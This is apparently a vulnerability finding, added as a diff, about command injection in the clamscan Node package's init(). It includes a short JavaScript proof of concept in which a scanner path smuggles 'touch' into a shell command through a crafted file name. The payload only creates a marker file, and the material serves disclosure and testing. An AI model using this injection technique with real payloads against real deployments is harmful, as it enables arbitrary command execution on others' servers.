@@ -1,0 +1,34 @@
+Confirmed: `clamscan@1.2.0`'s `init()` verifies the scanner binary via `child_process.exec()` (shell interpolation) on the attacker/config-controlled `clamscan.path` / `clamdscan.path` setting, so a malicious path string is executed as a shell command. Verified locally (created the marker file via injection, then cleaned up all test artifacts).
+
+```javascript
+const fs = require('fs');
+const os = require('os');
+const path = require('path');
+const NodeClam = require('./node_modules/clamscan');
+
+// clamscan's init() calls `exec(settings.clamscan.path + ' --version')`
+// using child_process.exec (a real shell), instead of execFile.
+// Any consumer that lets users configure the scanner "path" (e.g. via
+// an admin settings panel) allows full shell command injection here.
+
+const marker = 'pwned_' + Date.now() + '.txt';
+const maliciousPath = path.join(os.tmpdir(), `fake; touch ${marker} #`);
+
+// The literal file must exist for the internal fs.access() check to pass;
+// filenames can contain shell metacharacters on POSIX filesystems.
+fs.writeFileSync(maliciousPath, '');
+
+const clamscan = new NodeClam();
+
+clamscan.init({
+  preference: 'clamscan',
+  clamscan: { path: maliciousPath, active: true },
+  clamdscan: { active: false }
+}).catch(() => {}).finally(() => {
+  setTimeout(() => {
+    console.log(fs.existsSync(marker)
+      ? 'VULNERABLE: command injection executed -> ' + marker + ' created'
+      : 'exploit failed');
+  }, 500);
+});
+```
